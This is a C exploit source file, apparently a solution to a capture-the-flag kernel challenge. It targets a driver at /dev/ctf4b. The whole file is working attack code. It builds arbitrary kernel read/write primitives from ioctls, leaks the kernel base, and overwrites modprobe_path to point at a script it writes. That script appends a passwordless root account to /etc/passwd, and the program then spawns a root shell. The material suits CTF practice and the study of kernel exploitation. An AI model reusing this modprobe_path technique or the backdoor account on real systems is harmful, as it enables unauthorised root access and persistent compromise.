#include "../src/ctf4b.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define ulong unsigned long

int fd;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void clear_g_message() {
  char buf[0x100] = {0};
  ioctl(fd, CTF4B_IOCTL_STORE, buf);
}

void AAW(ulong addr, char* buf) {
  clear_g_message();
  ioctl(fd, CTF4B_IOCTL_STORE, buf);
  ioctl(fd, CTF4B_IOCTL_LOAD, addr);
}

ulong AAR(ulong addr) {
  ulong buf[CTF4B_MSG_SIZE / 8] = {0};
  clear_g_message();
  ioctl(fd, CTF4B_IOCTL_STORE, addr);
  ioctl(fd, CTF4B_IOCTL_LOAD, buf);
  return buf[0];
}

int main() {
  char *buf;

  buf = (char*)malloc(0x100);
  if (!buf)
    fatal("malloc");

  fd = open("/dev/ctf4b", O_RDWR);
  if (fd == -1)
    fatal("/dev/ctf4b");

  /* kbase leak */
  ulong cpu_entry_area = 0xfffffe0000000000;
  ulong leak = AAR(cpu_entry_area + 4);
  printf("[i] leak: 0x%016lx\n", leak);
  ulong kbase = leak - 0x808e00;
  printf("[i] kbase: 0x%016lx\n", kbase);
  ulong modprobe_path = kbase + 0xe3a080;
  printf("[i] modprobe_path: 0x%016lx\n", modprobe_path);

  /* Overwrite modprobe_path */
  puts("[+] Overwrite modprobe_path");
  char cmd[] = "/tmp/evil.sh\0";
  AAW(modprobe_path, cmd);

  /* Prepare evil script */
  puts("[+] Prepare evil script (/tmp/evil.sh)");
  FILE *file = fopen("/tmp/evil.sh", "w");
  if (file == NULL)
    fatal("evil.sh");
  fprintf(file, "#!/bin/sh\necho \"t3mp::0:0:root:/root:/bin/sh\" >> /etc/passwd\n");
  fclose(file);
  system("chmod +x /tmp/evil.sh");

  puts("[+] Execute invalid binary (/tmp/pwn)");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn");

  free(buf);
  close(fd);

  puts("[+] Spawning root shell...");
  system("su -c sh t3mp");

  return 0;
}
